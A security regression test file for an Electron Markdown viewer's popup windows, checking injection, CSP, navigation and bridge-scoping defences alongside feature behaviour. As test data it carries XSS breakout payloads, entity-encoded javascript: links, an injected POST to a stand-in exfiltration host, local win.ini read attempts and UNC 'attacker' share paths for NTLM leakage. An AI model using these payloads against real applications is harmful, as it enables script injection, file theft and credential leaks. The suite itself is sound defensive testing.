// Security regression tests for the popup windows opened by the main process.
// Run with: npm run test:popups
//
// The image, OmniWare and mermaid popups are built by string-concatenating
// markdown-derived values into a fresh HTML document which the main process
// then loads. Unlike the viewer's innerHTML sinks, these are parsed as full
// documents, so an injected <script> executes directly - and the windows were
// created with nodeIntegration, making that immediate RCE (SEC-05/06/07).
//
// Payloads set window.__pwned rather than spawning a process. Each attack test
// is paired with a feature test, because escaping these values is exactly the
// kind of change that silently breaks a title, an image or a wireframe.
const { app, BrowserWindow, ipcMain, session } = require("electron");
const fs = require("fs");
const path = require("path");

// ---------------------------------------------------------------------------
// Where the exfil / navigation probes point.
//
// These tests deliberately *attempt* outbound POSTs and navigations so they can
// prove CSP and the navigation guards stop them. They used to aim at
// example.com - which is reserved for documentation by RFC 2606, but is a real,
// live host operated by IANA whose own page asks you to "avoid use in
// operations". A test suite firing POSTs at it on every run is operations.
//
// `.invalid` is reserved by RFC 6761 s6.4 and is guaranteed never to resolve,
// so nothing can reach a third party even if every guard in the app failed.
//
// The trap: simply swapping the domain would *weaken* these tests. Assertions
// of the form "the fetch threw" or "the URL is not example.com" would then pass
// because DNS failed, not because CSP blocked anything - a false pass that
// survives deleting the security control entirely. So the domain change is
// paired with the sentinel below, which watches the network layer itself.
// ---------------------------------------------------------------------------
const PROBE_HOST = "mdv-exfil.invalid";

// Every request that reaches Electron's network stack, recorded but NOT
// cancelled. Cancelling here would make the sentinel the thing doing the
// blocking and prove nothing about the app. Because the target cannot resolve,
// recording is safe. An empty list means the request never got past CSP /
// the navigation guard - a strictly stronger claim than "the fetch threw".
const netSentinel = [];

function installNetSentinel() {
  const seen = new Set();
  for (const s of [session.defaultSession]) {
    if (!s || seen.has(s)) continue;
    seen.add(s);
    s.webRequest.onBeforeRequest((details, callback) => {
      if (/^(file|devtools|chrome-extension|blob|data):/i.test(details.url)) {
        return callback({ cancel: false });
      }
      netSentinel.push({ url: details.url, type: details.resourceType });
      callback({ cancel: false });
    });
  }
}

require("./main.js");

const results = [];

function check(name, ok, detail) {
  results.push({ name, ok, detail: ok ? "" : String(detail) });
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${ok ? "" : "  -> " + detail}`);
}

// Electron drops buffered stdout when app.exit() is called, so a redirected run
// (`> out.txt`) loses every line. Mirror the results to a file synchronously so
// the run is inspectable regardless of how stdout is captured.
function writeReport(summary) {
  const lines = results.map(
    (r) => `${r.ok ? "PASS" : "FAIL"}  ${r.name}${r.ok ? "" : "  -> " + r.detail}`,
  );
  lines.push(summary);
  try {
    fs.writeFileSync(
      path.join(__dirname, "test-popup-results.txt"),
      lines.join("\n") + "\n",
    );
  } catch (e) {
    console.log("could not write test-popup-results.txt: " + e.message);
  }
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

let hostWindow = null;

function mainWindow() {
  return hostWindow || BrowserWindow.getAllWindows()[0];
}

// Drives the real IPC entry point from the renderer, then returns the window
// the main process opened in response.
async function openPopup(channel, payload, settleMs = 1800) {
  const before = new Set(BrowserWindow.getAllWindows().map((w) => w.id));
  await mainWindow().webContents.executeJavaScript(
    `require('electron').ipcRenderer.send(${JSON.stringify(channel)}, ${JSON.stringify(payload)}); true`,
    true,
  );
  let popup = null;
  for (let i = 0; i < 60 && !popup; i++) {
    await sleep(100);
    popup = BrowserWindow.getAllWindows().find((w) => !before.has(w.id)) || null;
  }
  if (!popup) return null;
  if (popup.webContents.isLoading()) {
    await new Promise((resolve) => {
      popup.webContents.once("did-finish-load", resolve);
      setTimeout(resolve, 8000);
    });
  }
  await sleep(settleMs);
  return popup;
}

async function popupEval(popup, expr) {
  try {
    return await popup.webContents.executeJavaScript(expr, true);
  } catch (e) {
    return { __evalError: String(e && e.message) };
  }
}

async function pwned(popup) {
  const v = await popupEval(popup, "window.__pwned || null");
  return v && v.__evalError ? null : v;
}

function prefsOf(popup) {
  const p = popup.webContents.getLastWebPreferences() || {};
  return {
    nodeIntegration: p.nodeIntegration === true,
    contextIsolation: p.contextIsolation !== false,
  };
}

async function closeAll() {
  // Never close the host window: BrowserWindow.getAllWindows() does not
  // guarantee creation order, so indexing into it destroys the wrong window.
  for (const w of BrowserWindow.getAllWindows()) {
    if (w !== hostWindow && !w.isDestroyed()) w.destroy();
  }
  await sleep(300);
}

async function run() {
  await sleep(2500);
  hostWindow = BrowserWindow.getAllWindows()[0];
  installNetSentinel();

  // ==========================================================================
  // SEC-05 - image popup interpolates alt into <title> and into an attribute
  // ==========================================================================
  let popup = await openPopup("open-image-popup", {
    src: "x.png",
    alt: "</title><script>window.__pwned='img-title'</script>",
    isDarkMode: false,
  });
  check(
    "SEC-05 image popup opens for a hostile alt",
    popup !== null,
    "no popup window appeared",
  );
  if (popup) {
    check(
      "SEC-05 alt cannot break out of <title> in the image popup",
      (await pwned(popup)) === null,
      "window.__pwned was set from an image alt attribute",
    );
    const prefs = prefsOf(popup);
    check(
      "SEC-08 image popup does not run with Node integration",
      prefs.nodeIntegration === false && prefs.contextIsolation === true,
      JSON.stringify(prefs),
    );
  }
  await closeAll();

  // Second variant: break out of the alt="" attribute on the <img> itself.
  popup = await openPopup("open-image-popup", {
    src: "x.png",
    alt: '" onerror="window.__pwned=\'img-attr\'" data-x="',
    isDarkMode: false,
  });
  if (popup) {
    check(
      "SEC-05 alt cannot break out of the img alt attribute",
      (await pwned(popup)) === null,
      "window.__pwned was set via an alt attribute breakout",
    );
  }
  await closeAll();

  // Feature: an ordinary image still loads, with its alt and title intact.
  popup = await openPopup("open-image-popup", {
    src: "https://example.invalid/a.png",
    alt: 'Plain "quoted" & <angled> caption',
    isDarkMode: false,
  });
  if (popup) {
    const state = await popupEval(
      popup,
      `(() => {
         const img = document.getElementById('the-img');
         return {
           hasImg: !!img,
           src: img ? img.getAttribute('src') : null,
           alt: img ? img.getAttribute('alt') : null,
           title: document.title
         };
       })()`,
    );
    check(
      "FEATURE image popup still renders the image with its src and alt",
      state.hasImg === true &&
        state.src === "https://example.invalid/a.png" &&
        state.alt === 'Plain "quoted" & <angled> caption',
      JSON.stringify(state),
    );
    check(
      "FEATURE image popup title still carries the alt text",
      typeof state.title === "string" && state.title.includes("Plain"),
      JSON.stringify(state),
    );
  }
  await closeAll();

  // ==========================================================================
  // SEC-06 - OmniWare popup: </script> terminates the script element, so the
  // template-literal escaping does not contain the value
  // ==========================================================================
  popup = await openPopup(
    "open-omniware-popup",
    {
      dslCode:
        "@note\n  </scr" + "ipt><scr" + "ipt>window.__pwned='omniware'</scr" + "ipt>",
      isDarkMode: false,
    },
    2200,
  );
  check(
    "SEC-06 omniware popup opens for a hostile DSL",
    popup !== null,
    "no popup window appeared",
  );
  if (popup) {
    check(
      "SEC-06 DSL cannot terminate the popup's script element",
      (await pwned(popup)) === null,
      "window.__pwned was set from an OmniWare DSL block",
    );
    const prefs = prefsOf(popup);
    check(
      "SEC-08 omniware popup does not run with Node integration",
      prefs.nodeIntegration === false && prefs.contextIsolation === true,
      JSON.stringify(prefs),
    );
  }
  await closeAll();

  // Feature: the DSL must survive verbatim, including the characters the old
  // template-literal escaping existed to protect.
  const trickyDsl = "@note\n  Backtick ` and ${dollar} and \\backslash\\ and <angle>";
  popup = await openPopup(
    "open-omniware-popup",
    { dslCode: trickyDsl, isDarkMode: false },
    2200,
  );
  if (popup) {
    const dsl = await popupEval(
      popup,
      "(typeof dsl === 'string' ? dsl : (window.__omniwareDsl || null))",
    );
    check(
      "FEATURE omniware popup receives the DSL verbatim, special characters intact",
      dsl === trickyDsl,
      JSON.stringify({ got: dsl, want: trickyDsl }),
    );
  }
  await closeAll();

  // ==========================================================================
  // SEC-07 - mermaid popup interpolates the rendered SVG raw
  // ==========================================================================
  popup = await openPopup(
    "open-mermaid-popup",
    {
      svgContent:
        "<svg xmlns='http://www.w3.org/2000/svg'><text>d</text></svg>" +
        "<scr" + "ipt>window.__pwned='mermaid-popup'</scr" + "ipt>",
      isDarkMode: false,
    },
    2200,
  );
  check(
    "SEC-07 mermaid popup opens for hostile SVG content",
    popup !== null,
    "no popup window appeared",
  );
  if (popup) {
    check(
      "SEC-07 script smuggled in the SVG payload does not execute",
      (await pwned(popup)) === null,
      "window.__pwned was set from mermaid popup SVG content",
    );
    const prefs = prefsOf(popup);
    check(
      "SEC-08 mermaid popup does not run with Node integration",
      prefs.nodeIntegration === false && prefs.contextIsolation === true,
      JSON.stringify(prefs),
    );
  }
  await closeAll();

  // Feature: a genuine mermaid SVG still shows up in the popup.
  popup = await openPopup(
    "open-mermaid-popup",
    {
      svgContent:
        "<svg id='real-diagram' xmlns='http://www.w3.org/2000/svg' width='120' height='60'><text x='5' y='20'>Start</text></svg>",
      isDarkMode: false,
    },
    2200,
  );
  if (popup) {
    const state = await popupEval(
      popup,
      `(() => {
         const svg = document.querySelector('svg');
         return { hasSvg: !!svg, text: svg ? (svg.textContent || '').trim() : null };
       })()`,
    );
    check(
      "FEATURE mermaid popup still displays the rendered diagram",
      state.hasSvg === true && state.text === "Start",
      JSON.stringify(state),
    );
  }
  await closeAll();

  // ==========================================================================
  // CSP - the popups load from file://, and a file:// document in Electron can
  // read other local files and reach the network. So an injection that manages
  // to execute is local-file theft, not a contained nuisance. The nonce CSP is
  // the control that makes that unreachable; these assert it is actually on
  // each document and actually enforcing.
  // ==========================================================================
  const CSP_CASES = [
    ["mermaid", "open-mermaid-popup", { svgContent: "<svg xmlns='http://www.w3.org/2000/svg'></svg>", isDarkMode: false }],
    ["omniware", "open-omniware-popup", { dslCode: "screen Test {}", isDarkMode: false }],
    ["image", "open-image-popup", { src: "img/a.png", alt: "a", isDarkMode: false }],
    ["table", "open-table-popup", { tableData: { data: [{ a: "1" }], columns: [{ title: "A", field: "a" }] }, isDarkMode: false }],
  ];

  for (const [label, channel, payload] of CSP_CASES) {
    popup = await openPopup(channel, payload, 1500);
    if (!popup) {
      check(`CSP ${label} popup opens`, false, "no window appeared");
      continue;
    }
    const csp = await popupEval(
      popup,
      `(() => {
         const m = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
         return m ? m.getAttribute('content') : null;
       })()`,
    );
    check(
      `CSP ${label} popup declares a nonce policy`,
      typeof csp === "string" && /script-src 'nonce-[^']+'/.test(csp) && /connect-src 'none'/.test(csp),
      String(csp).slice(0, 120),
    );

    // The document's own script must still have run, otherwise the CSP has
    // simply broken the popup and the assertions below would pass vacuously.
    const alive = await popupEval(
      popup,
      `(() => {
         const nonced = [...document.querySelectorAll('script[nonce]')].length;
         return { nonced, body: document.body.innerHTML.length };
       })()`,
    );
    check(
      `CSP ${label} popup still has its own nonce-carrying script`,
      alive && alive.nonced > 0,
      JSON.stringify(alive),
    );

    // Inject a script the way an XSS payload would, and confirm the browser
    // refuses to run it because it carries no nonce.
    const injected = await popupEval(
      popup,
      `(async () => {
         const s = document.createElement('script');
         s.textContent = 'window.__cspEscape = true;';
         document.body.appendChild(s);
         const img = document.createElement('img');
         img.setAttribute('src', 'does-not-exist-zzz');
         img.setAttribute('onerror', 'window.__cspHandler = true;');
         document.body.appendChild(img);
         await new Promise(r => setTimeout(r, 400));
         let fileRead = 'blocked';
         try {
           const r = await fetch('file:///C:/Windows/win.ini');
           fileRead = 'READ:' + (await r.text()).length;
         } catch (e) {}
         let exfil = 'blocked';
         try { await fetch('https://${PROBE_HOST}/x', { method: 'POST', body: 'y' }); exfil = 'SENT'; } catch (e) {}
         return {
           scriptRan: !!window.__cspEscape,
           handlerRan: !!window.__cspHandler,
           fileRead,
           exfil,
         };
       })()`,
    );
    check(
      `CSP ${label} popup refuses an injected script element`,
      injected && injected.scriptRan === false,
      JSON.stringify(injected),
    );
    check(
      `CSP ${label} popup refuses an injected inline event handler`,
      injected && injected.handlerRan === false,
      JSON.stringify(injected),
    );
    check(
      `CSP ${label} popup cannot read local files or reach the network`,
      injected && injected.fileRead === "blocked" && injected.exfil === "blocked",
      JSON.stringify(injected),
    );
    await closeAll();
  }

  // ==========================================================================
  // Table popup - cells come from the markdown document and were embedded with
  // JSON.stringify, which does not escape `<`, so a cell could close the
  // script element.
  // ==========================================================================
  popup = await openPopup(
    "open-table-popup",
    {
      tableData: {
        data: [{ a: "</script><script>window.__pwned='table'</script>" }],
        columns: [{ title: "A", field: "a" }],
      },
      isDarkMode: false,
    },
    2200,
  );
  if (popup) {
    check(
      "SEC-06 table popup opens for hostile cell content",
      true,
    );
    // Two independent controls are in play here, so assert both. The CSP alone
    // stops the injected <script> from running - but the cell can still
    // terminate the generated <script> element, which silently destroys the
    // rest of the document. `scriptIntact` is the part that only toJsonLiteral
    // can satisfy: with a plain JSON.stringify the payload closes the script
    // and Tabulator never initialises.
    const structure = await popupEval(
      popup,
      `(() => {
         const scripts = [...document.querySelectorAll('script')];
         return {
           injectedScripts: scripts.filter((s) => !s.nonce && !s.src).length,
           tabulatorLoaded: typeof window.Tabulator !== 'undefined',
         };
       })()`,
    );
    check(
      "SEC-06 table cell cannot terminate the popup's script element",
      (await pwned(popup)) === null &&
        structure &&
        structure.injectedScripts === 0 &&
        structure.tabulatorLoaded === true,
      JSON.stringify(structure),
    );
    const table = await popupEval(
      popup,
      `(() => {
         const rows = document.querySelectorAll('.tabulator-row').length;
         const text = document.body.innerText || '';
         return { rows, hasTable: !!window.Tabulator, showsPayload: text.includes('script') };
       })()`,
    );
    check(
      "FEATURE table popup still builds the table from the data",
      table && table.hasTable === true && table.rows > 0,
      JSON.stringify(table),
    );
  } else {
    check("SEC-06 table popup opens for hostile cell content", false, "no window");
  }
  await closeAll();

  // ==========================================================================
  // Remote share paths in the image popup. On Windows an <img> pointing at a
  // UNC path makes Chromium perform an SMB fetch with no user interaction,
  // leaking the current user's NTLM hash to a host the author chose.
  // ==========================================================================
  const SHARE_CASES = [
    ["UNC backslash", "\\\\attacker\\share\\x.png"],
    ["protocol-relative", "//attacker/share/x.png"],
    ["file:// with host", "file://attacker/share/x.png"],
    ["file://// with host", "file:////attacker/share/x.png"],
    ["extended UNC", "\\\\?\\UNC\\attacker\\share\\x.png"],
  ];
  for (const [label, src] of SHARE_CASES) {
    popup = await openPopup("open-image-popup", { src, alt: "x", isDarkMode: false }, 1200);
    if (!popup) {
      check(`SEC-04 image popup drops ${label}`, false, "no window");
      continue;
    }
    const got = await popupEval(
      popup,
      `(() => { const i = document.getElementById('the-img'); return i ? i.getAttribute('src') : null; })()`,
    );
    check(`SEC-04 image popup drops ${label}`, got === "", JSON.stringify(got));
    await closeAll();
  }

  // The same helper must not throw away legitimate local sources.
  const KEEP_CASES = [
    ["drive path", "C:\\pics\\a.png"],
    ["file url", "file:///C:/pics/b.png"],
    ["relative path", "img/c.png"],
    ["https url", "https://example.invalid/d.png"],
  ];
  for (const [label, src] of KEEP_CASES) {
    popup = await openPopup("open-image-popup", { src, alt: "x", isDarkMode: false }, 1200);
    if (!popup) {
      check(`FEATURE image popup keeps ${label}`, false, "no window");
      continue;
    }
    const got = await popupEval(
      popup,
      `(() => { const i = document.getElementById('the-img'); return i ? i.getAttribute('src') : null; })()`,
    );
    check(`FEATURE image popup keeps ${label}`, got === src, JSON.stringify(got));
    await closeAll();
  }

  // ==========================================================================
  // Bridge scoping - each popup should get only the API it needs, so script in
  // one popup cannot drive another popup's privileged path.
  // ==========================================================================
  const BRIDGE_CASES = [
    ["mermaid", "open-mermaid-popup", { svgContent: "<svg xmlns='http://www.w3.org/2000/svg'></svg>", isDarkMode: false }, ["exportMermaidPdf"]],
    ["omniware", "open-omniware-popup", { dslCode: "screen T {}", isDarkMode: false }, ["exportOmniwarePdf"]],
    ["image", "open-image-popup", { src: "img/a.png", alt: "a", isDarkMode: false }, ["saveImage"]],
  ];
  for (const [label, channel, payload, expected] of BRIDGE_CASES) {
    popup = await openPopup(channel, payload, 1200);
    if (!popup) {
      check(`SEC-08 ${label} popup exposes only its own bridge API`, false, "no window");
      continue;
    }
    const keys = await popupEval(
      popup,
      `window.popupBridge ? Object.keys(window.popupBridge).sort() : null`,
    );
    check(
      `SEC-08 ${label} popup exposes only its own bridge API`,
      Array.isArray(keys) && keys.join(",") === expected.sort().join(","),
      JSON.stringify(keys),
    );
    await closeAll();
  }

  // ==========================================================================
  // Save-image payload validation. Only the rejection paths are exercised:
  // a valid payload opens a native save dialog, which would block the harness
  // forever.
  // ==========================================================================
  popup = await openPopup("open-image-popup", { src: "img/a.png", alt: "a", isDarkMode: false }, 1200);
  if (popup) {
    const bad = await popupEval(
      popup,
      `new Promise((resolve) => {
         window.popupBridge.saveImage('data:text/html;base64,PHNjcmlwdD4=', 'png', resolve);
         setTimeout(() => resolve({ timedOut: true }), 4000);
       })`,
    );
    check(
      "SEC-05 image save refuses a non-image data URL",
      bad && bad.success === false && !bad.timedOut,
      JSON.stringify(bad),
    );

    const notDataUrl = await popupEval(
      popup,
      `new Promise((resolve) => {
         window.popupBridge.saveImage('file:///C:/Windows/win.ini', 'png', resolve);
         setTimeout(() => resolve({ timedOut: true }), 4000);
       })`,
    );
    check(
      "SEC-05 image save refuses a non-data-URL payload",
      notDataUrl && notDataUrl.success === false && !notDataUrl.timedOut,
      JSON.stringify(notDataUrl),
    );
  } else {
    check("SEC-05 image save refuses a non-image data URL", false, "no window");
  }
  await closeAll();

  // ==========================================================================
  // Entity-encoded scheme in SVG. The javascript: strip used to run before the
  // parser decodes character references, so `javascript&#58;` survived it.
  // ==========================================================================
  const ENTITY_CASES = [
    ["numeric decimal", "javascript&#58;window.__pwned=1"],
    ["numeric hex", "javascript&#x3a;window.__pwned=1"],
    ["named colon entity", "javascript&colon;window.__pwned=1"],
  ];

  for (const [label, hostileHref] of ENTITY_CASES) {
    popup = await openPopup(
      "open-mermaid-popup",
      {
        svgContent:
          "<svg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='80' height='40'>" +
          `<a id='evil' xlink:href='${hostileHref}'><rect width='80' height='40'/></a></svg>`,
        isDarkMode: false,
      },
      1600,
    );
    if (popup) {
      const href = await popupEval(
        popup,
        `(() => {
           const a = document.getElementById('evil');
           if (!a) return null;
           return a.getAttribute('xlink:href') || a.getAttribute('href') || '';
         })()`,
      );
      check(
        `SEC-07 ${label} javascript scheme is stripped from SVG`,
        typeof href === "string" && !/javascript\s*:/i.test(href),
        JSON.stringify(href),
      );
    } else {
      check(`SEC-07 ${label} javascript scheme is stripped from SVG`, false, "no window");
    }
    await closeAll();
  }

  // ==========================================================================
  // SEC-11 (popups) - navigation. The CSP governs what a document may execute
  // and connect to; it says nothing about the document being replaced. Hostile
  // SVG can carry `<meta http-equiv="refresh">`, directly or inside a
  // <foreignObject>, and navigate the popup to an attacker page. That page is
  // then a normal remote origin - but it inherits the popup's preload, so the
  // popupBridge survives the navigation. Assert the popup cannot leave its own
  // temp file:// document.
  // ==========================================================================
  const NAV_PAYLOADS = [
    [
      "meta refresh",
      "<svg xmlns='http://www.w3.org/2000/svg' width='40' height='40'></svg>" +
        "<meta http-equiv='refresh' content=\"0;url=https://" + PROBE_HOST + "/meta-probe\">",
    ],
    [
      "meta refresh inside foreignObject",
      "<svg xmlns='http://www.w3.org/2000/svg' width='40' height='40'><foreignObject width='40' height='40'>" +
        "<meta http-equiv='refresh' content=\"0;url=https://" + PROBE_HOST + "/foreign-probe\">" +
        "</foreignObject></svg>",
    ],
  ];

  for (const [label, svgContent] of NAV_PAYLOADS) {
    popup = await openPopup("open-mermaid-popup", { svgContent, isDarkMode: false }, 1500);
    if (!popup) {
      check(`SEC-11 mermaid popup survives ${label}`, false, "no window");
      continue;
    }
    // Give any refresh the time it needs to actually fire before sampling.
    await new Promise((r) => setTimeout(r, 2500));
    const url = popup.isDestroyed() ? "<destroyed>" : popup.webContents.getURL();
    check(
      `SEC-11 mermaid popup cannot be navigated away by ${label}`,
      url.startsWith("file:///") && !url.includes(PROBE_HOST),
      url.slice(0, 140),
    );
    await closeAll();
  }

  // Same class, driven from script rather than markup: even if something did
  // execute, the window must not be able to relocate itself.
  popup = await openPopup(
    "open-mermaid-popup",
    { svgContent: "<svg xmlns='http://www.w3.org/2000/svg'></svg>", isDarkMode: false },
    1500,
  );
  if (popup) {
    await popupEval(popup, `(() => { try { location.href = 'https://${PROBE_HOST}/js-probe'; } catch (e) {} return 1; })()`);
    await new Promise((r) => setTimeout(r, 2000));
    const url = popup.isDestroyed() ? "<destroyed>" : popup.webContents.getURL();
    check(
      "SEC-11 mermaid popup cannot be navigated away by location assignment",
      url.startsWith("file:///") && !url.includes(PROBE_HOST),
      url.slice(0, 140),
    );
    // window.open must not spawn a second, unguarded window either.
    const before = BrowserWindow.getAllWindows().length;
    await popupEval(popup, `(() => { try { window.open('https://${PROBE_HOST}/open-probe'); } catch (e) {} return 1; })()`);
    await new Promise((r) => setTimeout(r, 1200));
    check(
      "SEC-11 mermaid popup cannot open a new window",
      BrowserWindow.getAllWindows().length === before,
      `${before} -> ${BrowserWindow.getAllWindows().length}`,
    );
  } else {
    check("SEC-11 mermaid popup cannot be navigated away by location assignment", false, "no window");
  }
  await closeAll();

  // ==========================================================================
  // FEATURE regression for the two controls added above. The table popup's CSV
  // and JSON export builds a Blob and clicks an <a download>. Both the CSP
  // (`default-src 'none'` plus a blob: allowance) and the navigation guards
  // could plausibly kill that, and it would fail silently in normal use. Assert
  // a download actually starts.
  // ==========================================================================
  popup = await openPopup(
    "open-table-popup",
    {
      tableData: {
        data: [{ a: "1", b: "x" }],
        columns: [
          { title: "A", field: "a" },
          { title: "B", field: "b" },
        ],
      },
      isDarkMode: false,
    },
    2200,
  );
  if (popup) {
    const started = [];
    const onWillDownload = (_e, item) => {
      started.push(item.getFilename());
      item.cancel();
    };
    popup.webContents.session.on("will-download", onWillDownload);

    await popupEval(popup, `(() => { exportCSV(); return 1; })()`);
    await new Promise((r) => setTimeout(r, 1500));
    check(
      "FEATURE table popup CSV export still starts a download under CSP",
      started.some((n) => /\.csv$/i.test(n)),
      JSON.stringify(started),
    );

    await popupEval(popup, `(() => { exportJSON(); return 1; })()`);
    await new Promise((r) => setTimeout(r, 1500));
    check(
      "FEATURE table popup JSON export still starts a download under CSP",
      started.some((n) => /\.json$/i.test(n)),
      JSON.stringify(started),
    );

    popup.webContents.session.removeListener("will-download", onWillDownload);
  } else {
    check("FEATURE table popup CSV export still starts a download under CSP", false, "no window");
  }
  await closeAll();

  // ---------------------------------------------------------------------
  // Theme carried by the REAL renderer -> popup path.
  //
  // Every other case in this file calls openPopup(), which sends the IPC
  // message straight to main.js with isDarkMode hardcoded false. That is the
  // right call for CSP and injection testing, but it means the flag the app
  // actually computes is never exercised - the suite would stay green if the
  // renderer stopped sending the theme entirely, and every popup would open
  // white against a dark app.
  //
  // That is not hypothetical. The mermaid theme bug fixed earlier in this fork
  // was exactly this shape: a theme value that was correct wherever the tests
  // looked and wrong on the path a user takes. So this section clicks the real
  // buttons in a real rendered document, in both themes, and asserts the popup
  // came up in the matching one.
  const themeDoc = "# T\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\n```mermaid\ngraph LR\n  PopA --> PopB\n```\n";
  for (const wantDark of [true, false]) {
    const label = wantDark ? "dark" : "light";
    const appState = await mainWindow().webContents.executeJavaScript(
      `(async () => {
        if (document.body.classList.contains('dark-mode') !== ${wantDark}) {
          document.getElementById('darkModeToggle').click();
        }
        await renderMarkdown(${JSON.stringify(themeDoc)}, 'full');
        return JSON.stringify({
          dark: document.body.classList.contains('dark-mode'),
          table: document.querySelectorAll('.table-maximize-btn').length,
          mermaid: document.querySelectorAll('.mermaid-maximize-btn').length
        });
      })()`,
      true,
    );
    await sleep(2500);
    const parsed = JSON.parse(appState);
    check(
      `FEATURE the app really is in ${label} mode with both maximize buttons rendered`,
      parsed.dark === wantDark && parsed.table === 1 && parsed.mermaid === 1,
      appState,
    );

    for (const [what, selector] of [
      ["table", ".table-maximize-btn"],
      ["mermaid", ".mermaid-maximize-btn"],
    ]) {
      const before = new Set(BrowserWindow.getAllWindows().map((w) => w.id));
      await mainWindow().webContents.executeJavaScript(
        `document.querySelector(${JSON.stringify(selector)}).click(); true`,
        true,
      );
      let popup = null;
      for (let i = 0; i < 60 && !popup; i++) {
        await sleep(100);
        popup = BrowserWindow.getAllWindows().find((w) => !before.has(w.id)) || null;
      }
      if (!popup) {
        check(`FEATURE ${what} popup opens from a real click in ${label} mode`, false, "no window");
        continue;
      }
      if (popup.webContents.isLoading()) {
        await new Promise((resolve) => {
          popup.webContents.once("did-finish-load", resolve);
          setTimeout(resolve, 8000);
        });
      }
      await sleep(600);
      // Asserted as a luminance band rather than an exact hex so that a palette
      // tweak does not fail the suite; what must never happen is a light popup
      // over a dark app.
      const bg = await popupEval(
        popup,
        `(() => {
          const c = getComputedStyle(document.body).backgroundColor;
          const m = c.match(/\\d+/g) || [255, 255, 255];
          const lum = (0.299 * +m[0] + 0.587 * +m[1] + 0.114 * +m[2]) / 255;
          return JSON.stringify({ c, lum });
        })()`,
      );
      const lum = bg && !bg.__evalError ? JSON.parse(bg).lum : null;
      check(
        `FEATURE ${what} popup opened from a real click follows the app's ${label} theme`,
        lum !== null && (wantDark ? lum < 0.3 : lum > 0.7),
        `${bg} (window bg ${popup.getBackgroundColor && popup.getBackgroundColor()})`,
      );
      await closeAll();
    }
  }

  // ==========================================================================
  // SEC-11/12 - the network sentinel.
  //
  // Everything above asserted on symptoms observable from inside the page: the
  // fetch threw, the URL did not change. Those are all satisfiable by a request
  // that leaves the process and merely fails. This asserts the opposite and
  // much stronger property - that nothing ever reached Electron's network stack
  // at all, so CSP and the navigation guard stopped it before egress.
  //
  // Non-vacuous by construction: the probes above genuinely attempt a POST, a
  // meta refresh, a location assignment and a window.open. Remove the CSP or
  // the will-navigate guard and entries appear here.
  // ==========================================================================
  const escaped = netSentinel.filter((r) => r.url.includes(PROBE_HOST));
  check(
    "SEC-11/12 no exfil or navigation probe ever reached the network stack",
    escaped.length === 0,
    JSON.stringify(escaped.slice(0, 5)),
  );
  // The popups legitimately render remote <img> referenced by the document, so
  // "zero requests" is the wrong invariant - it would fail on a working
  // feature. The right one is that image loading is the *only* egress the
  // popup can perform: no XHR/fetch, no script, no stylesheet, no subframe,
  // no navigation. Anything else appearing here is a new covert channel.
  //
  // Worth recording as a product observation rather than a test failure:
  // maximizing an image from a hostile document does contact its host, which
  // leaks the reader's IP. That is inherited from the main viewer's behaviour
  // and is a policy decision, not a regression - see SECURITY-AUDIT.md.
  const nonImage = netSentinel.filter((r) => r.type !== "image");
  check(
    "SEC-12 popups can only ever emit image loads, never any other request type",
    nonImage.length === 0,
    JSON.stringify(nonImage.slice(0, 5)),
  );
}

app.whenReady().then(async () => {
  // If another copy of the app is already running, main.js's single-instance
  // lock quits this process during startup and the suite produces no output at
  // all - which looks exactly like a crash. Say so explicitly.
  if (!BrowserWindow.getAllWindows().length) {
    console.log(
      "FAIL  no window at ready - another instance is probably holding the " +
        "single-instance lock. Close any running Markdown Viewer / stray " +
        "electron.exe and re-run.",
    );
  }

  const watchdog = setTimeout(() => {
    const failed = results.filter((r) => !r.ok).length;
    console.log(
      "FAIL  harness timed out after 240s - a blocking dialog is most likely open",
    );
    const summary = `=== ${results.length - failed}/${results.length + 1} passed (TIMED OUT) ===`;
    console.log(summary);
    writeReport(summary);
    app.exit(1);
  }, 240000);

  try {
    await run();
  } catch (e) {
    check("harness completed without throwing", false, String(e && e.stack));
  }

  clearTimeout(watchdog);
  const passed = results.filter((r) => r.ok).length;
  const summary = `=== ${passed}/${results.length} passed ===`;
  console.log(summary);
  writeReport(summary);
  app.exit(passed === results.length ? 0 : 1);
});
